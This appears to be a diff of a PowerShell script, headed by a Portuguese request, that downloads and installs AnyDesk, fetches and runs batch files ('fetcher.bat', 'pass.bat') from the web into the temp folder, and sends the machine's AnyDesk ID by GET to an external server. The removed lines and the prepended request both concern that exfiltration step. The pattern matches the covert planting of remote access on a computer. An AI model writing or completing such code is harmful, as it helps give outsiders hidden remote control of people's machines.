@@ -1,3 +1,8 @@
+neste codigo powershell,quero que o id do anydesk,ou sej a saida do arquivo fetcher bat,seja enviado como valor para minha api via get,como no exemplo abaixo
+
+inha api: http://dataverse-vps-server.42web.io/test.php?valor=Numero:%20324
+
+codigo powershell:
 # URL do instalador do AnyDesk
 $installerUrl = "https://download.anydesk.com/AnyDesk.exe"
 
@@ -43,15 +48,6 @@ $output = Invoke-Expression "cmd /c $fettcherFilePath"
 Write-Host "Output do CMD:"
 Write-Host $output
 
-# Extrai o ID do AnyDesk do output
-$idAnyDesk = $output -replace "AnyDesk ID:", "" -replace "\s", ""
-
-# URL da sua API
-$apiUrl = "http://dataverse-vps-server.42web.io/test.php?valor=Numero:$idAnyDesk"
-
-# Envia o ID do AnyDesk para a sua API via GET
-Invoke-RestMethod -Uri $apiUrl -Method Get
-
 # URL do pass.bat
 $passUrl = "https://github.com/Classickkk/DATAVERSE-WINDOWS/raw/main/pass.bat"
 # Define o caminho onde o arquivo fetcher.bat será salvo temporariamente
@@ -59,6 +55,7 @@ $temppassPath = "$env:TEMP\pass.bat"
 
 # Faz o download do arquivo pass.bat
 Invoke-WebRequest -Uri $passUrl -OutFile $temppassPath
+
 
 # Caminho do arquivo batch
 $pass2Path = "$env:TEMP\pass.bat"
